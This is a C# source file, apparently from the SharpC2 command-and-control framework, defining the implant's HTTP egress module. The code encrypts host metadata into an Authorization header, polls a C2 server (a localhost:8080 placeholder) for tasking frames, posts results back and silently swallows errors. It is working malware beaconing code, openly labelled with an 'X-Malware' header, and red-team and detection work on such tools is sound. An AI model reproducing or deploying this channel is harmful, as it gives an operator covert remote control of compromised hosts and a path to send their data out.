using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Threading.Tasks;

namespace Drone.CommModules;

public class HttpCommModule : EgressCommModule
{
    private HttpClient _client;

    public override ModuleType Type => ModuleType.EGRESS;
    public override ModuleMode Mode => ModuleMode.CLIENT;
    
    public override void Init(Metadata metadata)
    {
        _client = new HttpClient();
        _client.BaseAddress = new Uri($"{Schema}://{ConnectAddress}:{ConnectPort}");
        _client.DefaultRequestHeaders.Clear();

        var enc = Crypto.Encrypt(metadata);
        _client.DefaultRequestHeaders.Add("Authorization", $"Bearer {Convert.ToBase64String(enc)}");
        _client.DefaultRequestHeaders.Add("X-Malware", "SharpC2");
    }

    public override async Task<IEnumerable<C2Frame>> CheckIn()
    {
        try
        {
            var response = await _client.GetByteArrayAsync("/");
            return response.Deserialize<IEnumerable<C2Frame>>();
        }
        catch
        {
            return Array.Empty<C2Frame>();
        }
    }

    public override async Task SendFrame(C2Frame frame)
    {
        var content = new ByteArrayContent(frame.Serialize());

        try
        {
            await _client.PostAsync("/", content);
        }
        catch
        {
            // ignore
        }
    }

    private static string Schema => "http";
    private static string ConnectAddress => "localhost";
    private static string ConnectPort => "8080";
}